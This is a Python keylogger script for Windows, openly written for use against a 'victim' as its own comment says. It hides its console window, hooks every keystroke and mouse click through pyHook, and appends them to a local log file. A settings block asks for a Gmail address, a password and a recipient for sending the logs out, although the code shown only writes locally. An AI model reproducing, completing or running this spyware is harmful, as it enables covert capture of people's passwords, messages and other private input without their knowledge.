#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
.d88888b                             oo   dP            
88.    "'                                 88            
`Y88888b. .d8888b. dP    dP 88d888b. dP d8888P dP    dP 
      `8b 88'  `88 88    88 88'  `88 88   88   88    88 
d8'   .8P 88.  .88 88.  .88 88    88 88   88   88.  .88 
 Y88888P  `8888P88 `88888P' dP    dP dP   dP   `8888P88 
                88                                  .88 
                dP                              d8888P 
"""

import sys
import win32api,pythoncom
import pyHook,os,time,random,smtplib,string,base64
# from _winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]


#Note: You have to edit this part from sending the keylogger to the victim

#########Settings########

yourgmail=""                                        #What is your gmail?
yourgmailpass=""                                    #What is your gmail password
sendto=""                                           #Where should I send the logs to? (any email address)
interval=60                                         #Time to wait before sending data to email (in seconds)

########################

try:

    f = open('logs', 'a')
    f.close()
except:

    f = open('logs', 'w')
    f.close()



def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


Hide()



def OnMouseEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = ' ' + ' ' + ' ' \
        + ' ' + ' '
    data += ' ' + str(event.MessageName)
    data += ' ' + str(event.Position)
    data += ' '
    global t, start_time, pics_names

    t = t + data

    if len(t) > 1:
        f = open('logs', 'a')
        f.write(t)
        f.close()
        t = ''

    return True


def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = ' ' + ' ' + ' ' \
        + ' ' + ''
    data += '' + str(event.Key)
    data += ' '
    global t, start_time
    t = t + data

    if len(t) > 1:
        f = open('logs', 'a')
        f.write(t)
        f.close()
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
